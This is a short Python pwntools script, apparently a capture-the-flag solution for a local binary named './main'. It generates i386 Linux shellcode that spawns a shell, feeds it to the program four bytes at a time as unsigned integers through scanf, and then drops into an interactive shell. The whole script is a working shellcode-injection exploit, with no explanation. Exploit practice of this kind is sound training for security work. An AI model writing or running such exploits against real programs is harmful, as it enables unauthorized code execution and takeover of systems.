from pwn import *

context.arch = "i386"
context.os = "linux"
context.endian = "little"
context.terminal = ["tmux", "splitw", "-h"]

shellcode = shellcraft.sh()
print(shellcode)

shellcode_binary = asm(shellcode, arch="i386", os="linux")

e = ELF("./main")
sh = process("./main")
# sh = gdb.debug(
#     "./main",
#     """
#     b __isoc99_scanf
# b *(wanna_shellcode + 0xc8)
#     """,
# )

print(shellcode_binary)

four_bytes = (shellcode_binary[i : i + 4] for i in range(0, len(shellcode_binary), 4))
for for_byte in four_bytes:
    unsigned_int = u32(for_byte)
    sh.sendline(str(unsigned_int))

sh.sendline()
# sh.sendline(shellcode_binary)
sh.interactive()
